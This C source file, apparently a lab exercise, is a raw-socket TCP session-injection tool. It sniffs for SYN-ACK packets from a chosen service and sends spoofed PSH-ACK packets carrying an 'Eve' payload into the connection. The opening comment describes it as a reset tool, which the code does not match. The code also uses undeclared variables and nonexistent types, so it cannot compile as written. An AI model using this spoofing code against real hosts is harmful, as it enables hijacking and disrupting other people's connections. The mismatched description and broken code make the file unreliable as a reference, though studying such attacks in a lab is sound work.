/*
 *   A reseter that blocks TCP communication to a given service.
 *   It sniffs all traffic for packets that match the given IP and port,
 *   And it will send out reset packets to both the service and the sender
 *   of packets to terminate the communication.
*/
#include <signal.h>
#include <sys/wait.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include<netinet/ip_icmp.h>
#include<netinet/udp.h>


// Constants
#define DATAGRAMSIZE 100 // number of bytes for raw datagram
#define PSEUDOPACKETSIZE 100 // number of bytes for pseudo packet
#define DATAGRAM_MAX 65536 // max number of bytes for IP packets
#define PAYLOAD "Hello, I'm Eve!"

// Functions
uint16_t ip_checksum(void*,size_t);
// void send_synack(const int, const char *, const char *, const uint32_t, const uint32_t, 
//     const uint16_t, const uint16_t, uint32_t, uint32_t);
void send_pshack(const size_t, const int, const char *, const char *, const uint32_t, const uint32_t, 
    const uint16_t, const uint16_t, uint32_t, uint32_t);
void print_ip_header(unsigned char* , int);
void print_tcp_packet(unsigned char* , int);
void PrintData (unsigned char* , int);
// void sigint_handler(int);
void sigchld_handler(int);

// Pseudo header needed for calculating the TCP header checksum
struct pshdr {
  uint32_t src_addr;
  uint32_t dst_addr;
  uint8_t reserved;
  uint8_t protocol;
  uint16_t tcp_len;
};

// Global Vars
int sock_raw;
FILE *logfile;
int i,j;
struct sockaddr_in source,dest;

int main(int argc, char *argv[]) {
    int attack_sock, sniff_sock, count = 0, num, rv, yes = 1;
    char service_ip[INET6_ADDRSTRLEN];
    uint16_t service_port;
    struct sockaddr_storage saddr;
    uint32_t service_addr;
    socklen_t addr_len;
    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE];
    unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
    struct sigaction csa;
    struct iphdr *iph, *new_iph;
    struct tcphdr *tcph, *cstcph, *new_tcph;
    struct pshdr *psh;
    uint16_t win = 8192, id0 = rand() %(65536);
    size_t tcp_len;
    struct sockaddr_in sa;
    char *data;

    logfile=fopen("injection.log","w+");

    csa.sa_handler = sigchld_handler; // reap all dead processes
	sigemptyset(&csa.sa_mask);
	csa.sa_flags = SA_RESTART;
	if (sigaction(SIGCHLD, &csa, NULL) == -1) {
		perror("sigaction");
		exit(1);
	}

    if (argc != 3) {
	    fprintf(stderr,"usage: injection service_ip service_port\n");
	    exit(1);
	}

    if (strlen(argv[1]) > INET6_ADDRSTRLEN) {
        fprintf(stderr,"please enter a valid IP\n");
	    exit(1);
    }

    strcpy(service_ip, argv[1]);
    inet_pton(AF_INET, service_ip, &(service_addr)); 

    service_port = (uint16_t) atoi(argv[2]);
    if ((service_port >= USHRT_MAX)) {
        fprintf(stderr,"service_port < %u\n", USHRT_MAX);
	    exit(1);
    }

    service_port = htons(service_port);

    // open attack socket
    if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("injection: socket\n");
        exit(1);
    }

    //Set option IP_HDRINCL (headers are included in packet)
    if(setsockopt(attack_sock, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) < 0) {
        perror("injection: setsockopt\n");
        exit(-1);
    }

    // pre-fill TCP, IP and pseudo headers

    // carve out IP header and TCP header
    memset(datagram, 0, sizeof datagram);
    iph = (struct iphdr *) datagram;
    tcph = (struct tcphdr *) (iph + 1);
    data = (char *) (tcph + 1);
    strcpy(data, PAYLOAD);

    tcp_len = sizeof(struct tcphdr) + strlen(data);

    iph -> daddr = service_addr;
    iph -> version = 4; // IPv4
    iph -> ihl = 5; // 5 * 32 bits
    iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
    iph -> id = htons(id0); // start ID
    iph -> frag_off = 0x00;
    iph -> ttl = 64; // time to live
    iph -> protocol = IPPROTO_TCP; // TCP
    
    tcph -> dest = service_port;
    tcph -> doff = 5; // 5 * 32-bit tcp header
    tcph -> ack = 1;
    tcph -> psh = 1;
    tcph -> window = htons(win); // 16 bits
    tcph -> check = 0; // 16 bits. init to 0.

    // construct psudo packet
    memset(pseudo_packet, 0, sizeof pseudo_packet);
    psh = (struct pshdr *) pseudo_packet;
    cstcph = (struct tcphdr *) (psh + 1);
    memcpy(cstcph, (char *)tcph, tcp_len);

    // pack pseudo header
    psh -> dst_addr = service_addr;
    psh -> reserved = 0;
    psh -> protocol = IPPROTO_TCP; // TCP
    psh -> tcp_len = htons(tcp_len); // TCP segment length

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = service_addr;

    // Open sniff socket
    if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("fakesync: socket\n");
        goto error;
    }

    // main loop
    while(1) {
        // capture frames
        addr_len = sizeof saddr;
        if ((num = recvfrom(sniff_sock, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
        {
            perror("recvfrom()\n");
            goto error;
        }

        if (!fork()) {
            new_iph = (struct new_iphdr *) buf;
            new_tcph= (struct new_tcphdr*) (buf + new_iph->ihl * 4);

            // check for syn to the service

            if (new_iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
            if ((new_tcph -> syn != 1) || (new_tcph -> ack != 1)) goto final; // only care about syn ack packets
            if ((new_iph -> saddr != service_addr) && (new_tcph -> source != service_port)) goto final; // destination has to be the service
            // print_tcp_packet(buf, num); // log the packet;
            
            // send_pshack(strlen(data), attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // psh ack to server
            tcph -> source = new_tcph->dest; // source port
            cstcph -> source = new_tcph->dest;
            tcph -> seq = new_tcph->ack_seq + htonl(1); // sequence number
            cstcph -> seq = new_tcph->ack_seq + htonl(1);
            tcph -> ack_seq = new_tcph->seq; // ack sequence number
            cstcph -> ack_seq = new_tcph->seq;

            // dynamic pseudo fields
            psh -> src_addr = new_iph->daddr;

            // calculate check sum
            tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 

            // dynamic IP fields
            iph -> saddr = new_iph->daddr;

            // inet_ntop(AF_INET, &(daddr), ipstr, INET_ADDRSTRLEN);

            // fprintf(logfile, "DEBUG sending PSH ACK to service %s:%u ......\n", ipstr, ntohs(dport));
            // fprintf(logfile, "DEBUG %s\n", ipstr);

            if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
            {
                perror("fakesync: sendto()\n");
            }
            goto final;
        }
    }

final:
    fclose(logfile);
    close(sniff_sock);
    close(attack_sock);
    return 0;
error:
    close(attack_sock);
    close(sniff_sock);
    exit(1);
}

void sigchld_handler(int s)
{
	(void)s; // quiet unused variable warning

	// waitpid() might overwrite errno, so we save and restore it:
	int saved_errno = errno;

	while(waitpid(-1, NULL, WNOHANG) > 0);

	errno = saved_errno;
}

uint16_t ip_checksum(void* vdata,size_t length) {
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)vdata;

    // Initialise the accumulator.
    uint32_t acc=0xffff;

    // Handle complete 16-bit blocks.
    for (size_t i=0;i+1<length;i+=2) {
        uint16_t word;
        memcpy(&word,data+i,2);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Handle any partial block at the end of the data.
    if (length&1) {
        uint16_t word=0;
        memcpy(&word,data+length-1,1);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Return the checksum in network byte order.
    return htons(~acc);
}

void send_pshack(const size_t data_size, const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
    const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
{

    // dynamic TCP fields
    tcph -> source = sport; // source port
    cstcph -> source = sport;
    tcph -> seq = htonl(seq0); // sequence number
    cstcph -> seq = htonl(seq0);
    tcph -> ack_seq = htonl(ack0); // ack sequence number
    cstcph -> ack_seq = htonl(ack0);

    // dynamic pseudo fields
    psh -> src_addr = saddr;

    // calculate check sum
    tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 

    // dynamic IP fields
    iph -> saddr = saddr;

    inet_ntop(AF_INET, &(daddr), ipstr, INET_ADDRSTRLEN);

    // fprintf(logfile, "DEBUG sending PSH ACK to service %s:%u ......\n", ipstr, ntohs(dport));
    // fprintf(logfile, "DEBUG %s\n", ipstr);

    if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
    {
        perror("fakesync: sendto()\n");
    }
    // fprintf(logfile, "DEBUG PSH ACK sent to service %s:%u\n", ipstr, ntohs(dport));
}

void print_ip_header(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;
         
    struct iphdr *iph = (struct iphdr *)Buffer;
    iphdrlen =iph->ihl*4;
     
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr;
     
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;
     
    fprintf(logfile,"\n");
    fprintf(logfile,"IP Header\n");
    fprintf(logfile,"   |-IP Version        : %d\n",(unsigned int)iph->version);
    fprintf(logfile,"   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
    fprintf(logfile,"   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
    fprintf(logfile,"   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
    fprintf(logfile,"   |-Identification    : %d\n",ntohs(iph->id));
    //fprintf(logfile,"   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
    //fprintf(logfile,"   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
    //fprintf(logfile,"   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
    fprintf(logfile,"   |-TTL      : %d\n",(unsigned int)iph->ttl);
    fprintf(logfile,"   |-Protocol : %d\n",(unsigned int)iph->protocol);
    fprintf(logfile,"   |-Checksum : %d\n",ntohs(iph->check));
    fprintf(logfile,"   |-Source IP        : %s\n",inet_ntoa(source.sin_addr));
    fprintf(logfile,"   |-Destination IP   : %s\n",inet_ntoa(dest.sin_addr));
}
 
void print_tcp_packet(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;
     
    struct iphdr *iph = (struct iphdr *)Buffer;
    iphdrlen = iph->ihl*4;
     
    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen);
             
    fprintf(logfile,"\n\n***********************TCP Packet*************************\n");    
         
    print_ip_header(Buffer,Size);
         
    fprintf(logfile,"\n");
    fprintf(logfile,"TCP Header\n");
    fprintf(logfile,"   |-Source Port      : %u\n",ntohs(tcph->source));
    fprintf(logfile,"   |-Destination Port : %u\n",ntohs(tcph->dest));
    fprintf(logfile,"   |-Sequence Number    : %u\n",ntohl(tcph->seq));
    fprintf(logfile,"   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
    fprintf(logfile,"   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
    //fprintf(logfile,"   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
    //fprintf(logfile,"   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
    fprintf(logfile,"   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
    fprintf(logfile,"   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
    fprintf(logfile,"   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
    fprintf(logfile,"   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
    fprintf(logfile,"   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
    fprintf(logfile,"   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
    fprintf(logfile,"   |-Window         : %d\n",ntohs(tcph->window));
    fprintf(logfile,"   |-Checksum       : %d\n",ntohs(tcph->check));
    fprintf(logfile,"   |-Urgent Pointer : %d\n",tcph->urg_ptr);
    fprintf(logfile,"\n");
    fprintf(logfile,"                        DATA Dump                         ");
    fprintf(logfile,"\n");
         
    fprintf(logfile,"IP Header\n");
    PrintData(Buffer,iphdrlen);
         
    fprintf(logfile,"TCP Header\n");
    PrintData(Buffer+iphdrlen,tcph->doff*4);
         
    fprintf(logfile,"Data Payload\n");  
    PrintData(Buffer + iphdrlen + tcph->doff*4 , (Size - tcph->doff*4-iph->ihl*4) );
                         
    fprintf(logfile,"\n###########################################################\n");
}
 
void PrintData (unsigned char* data , int Size)
{
     
    for(i=0 ; i < Size ; i++)
    {
        if( i!=0 && i%16==0)   //if one line of hex printing is complete...
        {
            fprintf(logfile,"         ");
            for(j=i-16 ; j<i ; j++)
            {
                if(data[j]>=32 && data[j]<=128)
                    fprintf(logfile,"%c",(unsigned char)data[j]); //if its a number or alphabet
                 
                else fprintf(logfile,"."); //otherwise print a dot
            }
            fprintf(logfile,"\n");
        } 
         
        if(i%16==0) fprintf(logfile,"   ");
            fprintf(logfile," %02X",(unsigned int)data[i]);
                 
        if( i==Size-1)  //print the last spaces
        {
            for(j=0;j<15-i%16;j++) fprintf(logfile,"   "); //extra spaces
             
            fprintf(logfile,"         ");
             
            for(j=i-i%16 ; j<=i ; j++)
            {
                if(data[j]>=32 && data[j]<=128) fprintf(logfile,"%c",(unsigned char)data[j]);
                else fprintf(logfile,".");
            }
            fprintf(logfile,"\n");
        }
    }
}